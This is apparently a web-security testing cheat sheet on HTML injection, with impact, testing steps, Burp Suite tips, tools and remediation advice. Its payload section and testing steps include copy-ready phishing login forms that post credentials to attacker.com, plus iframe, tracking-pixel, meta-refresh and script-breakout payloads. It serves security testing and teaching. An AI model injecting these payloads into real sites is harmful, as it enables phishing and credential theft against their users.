# HTML Injection

## Overview
HTML Injection occurs when an attacker can insert arbitrary HTML markup into a web page that is then rendered by the victim's browser. It arises when user-supplied input is reflected or stored in a response without proper encoding or sanitization. While less severe than Cross-Site Scripting (XSS), it can be used for phishing, content spoofing, credential harvesting, and as a stepping stone to full XSS.

## How It Works
The application takes user input — typically from URL parameters, form fields, HTTP headers, or stored data — and inserts it directly into the HTML response body without escaping HTML metacharacters (`<`, `>`, `"`, `'`, `&`). When the browser parses the response, it interprets the injected markup as legitimate HTML, allowing the attacker to modify page layout, inject fake content, or embed forms and iframes. Unlike XSS, pure HTML injection does not necessarily execute JavaScript, but it manipulates what the user sees and can trick them into submitting credentials or clicking malicious links.

## Impact
- Phishing and social engineering by injecting fake login forms or error messages
- Credential harvesting via injected `<form>` elements pointing to attacker-controlled servers
- Content spoofing — defacing visible page content to spread misinformation
- Clickjacking-style UI redressing by overlaying fake UI elements
- Chaining to XSS if script execution restrictions are bypassed
- Breaking page layout to cause denial of functionality
- Injecting hidden tracking pixels or external resource loads

## Where to Look
- URL query parameters reflected in the page body or title
- Search boxes that echo the query string back to the user
- Error messages that include user-supplied input
- Form fields whose values are pre-filled from GET/POST parameters
- HTTP headers (User-Agent, Referer, X-Forwarded-For) logged and rendered in admin panels
- Comment and profile fields in applications with stored content
- Email templates that incorporate user input without encoding
- 404 or other error pages that reflect the requested URL path
- Redirect parameters that display a "redirecting to..." message

## Testing Steps
1. Identify all input vectors that are reflected in HTTP responses — use Burp Suite's "Proxy > HTTP history" and search for your test string.
2. Submit a basic HTML tag as input: `<h1>INJECT</h1>`. Check if it renders as a heading in the browser.
3. If the string is HTML-encoded, check if double encoding bypasses it: `%3Ch1%3EINJECT%3C/h1%3E`.
4. Try breaking out of attribute contexts: submit `"><h1>INJECT</h1>` to close an existing attribute and tag.
5. Test stored injection: submit payloads to profile fields, comments, usernames, etc., then view them in a different browser session.
6. Inject a fake login form and verify it renders:
   ```html
   <form action="https://attacker.com/steal" method="POST">
     <p>Session expired. Please log in again.</p>
     Username: <input name="u"><br>
     Password: <input type="password" name="p"><br>
     <input type="submit" value="Login">
   </form>
   ```
7. Inject an `<iframe>` pointing to an external resource to verify external content loading.
8. Inspect the page source to understand the injection context (inside a tag attribute, inside a script block, inside a comment, etc.).
9. Check if the Content-Type response header is `text/html` — HTML injection in `application/json` responses only matters if they are rendered in an HTML context.
10. Verify the injection persists across sessions (stored) or is only present in the immediate response (reflected).

## Payloads / Techniques

Basic tag injection:
```html
<h1>Injected Heading</h1>
<b>Bold text</b>
<marquee>Scrolling text</marquee>
```

Attribute breakout:
```html
"><h1>Injected</h1>
'><h1>Injected</h1>
```

Fake login form (phishing):
```html
<br><br><br>
<div style="font-family:Arial;border:1px solid #ccc;padding:20px;width:300px;margin:auto">
  <h2>Session Expired</h2>
  <p>Your session has timed out. Please re-enter your credentials.</p>
  <form action="https://attacker.com/capture" method="POST">
    Email: <input type="email" name="email" style="width:100%"><br><br>
    Password: <input type="password" name="pass" style="width:100%"><br><br>
    <input type="submit" value="Log In" style="width:100%">
  </form>
</div>
```

Iframe injection (embedding external content):
```html
<iframe src="https://attacker.com/fake-page" width="100%" height="500" frameborder="0"></iframe>
```

Image-based tracking pixel / SSRF probe:
```html
<img src="https://attacker.com/pixel.gif" width="1" height="1">
```

Meta refresh redirect:
```html
<meta http-equiv="refresh" content="0; url=https://attacker.com/phish">
```

Inject inside JavaScript string context:
```
';alert(document.domain);//
```

CSS injection via style tag:
```html
<style>body{display:none}</style>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  [Fake page content here]
</div>
```

## Burp Suite Tips
- Use **Intruder** with a payload list of HTML tags and special characters to fuzz all parameters systematically.
- Enable **Render** view in the Repeater response pane to visually confirm whether injected HTML is rendered.
- Use **Proxy > Intercept** to modify form values, cookies, and headers on the fly.
- In **Scanner** (Pro), look for "HTML Injection" and "Reflected XSS" findings — HTML injection is often flagged alongside XSS.
- Use the **Comparer** tool to diff two responses: one with a benign input and one with an injection payload, to spot where your input lands.
- Set up a **Match and Replace** rule under Proxy Options to automatically append a marker string (like `HTMLTEST`) to all parameters to quickly find reflected points.
- For stored injection, use **Burp Collaborator** to detect out-of-band data exfiltration from injected resources.

## Tools
- Burp Suite (Community/Pro) — primary interception and fuzzing platform
- OWASP ZAP — automated scanner with HTML injection detection
- Nikto — basic web server scanner
- DalFox — parameter discovery and injection testing
- ffuf — fuzz parameters at speed
- curl — crafting manual HTTP requests with payloads
- Browser DevTools — inspect DOM to understand injection context

## Remediation
- Output encode all user-supplied data before rendering it in HTML: use HTML entity encoding for the HTML body context (`&`, `<`, `>`, `"`, `'` → `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#x27;`).
- Use a templating engine that auto-escapes output by default (Jinja2 with autoescape, React JSX, etc.).
- Apply context-aware encoding: HTML encode for HTML body, attribute encode for tag attributes, JavaScript encode for script contexts, URL encode for URLs.
- Implement a strong Content Security Policy (CSP) to limit the impact of any injection that does occur.
- Validate input on the server side — reject or strip unexpected characters where possible, but do not rely solely on input validation for security.
- Set the `X-Content-Type-Options: nosniff` header to prevent MIME-type sniffing.
- For rich text fields where HTML must be allowed, use an allowlist-based HTML sanitizer library (DOMPurify, bleach).

## References
https://owasp.org/www-community/attacks/HTML_Injection
https://portswigger.net/web-security/cross-site-scripting
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection
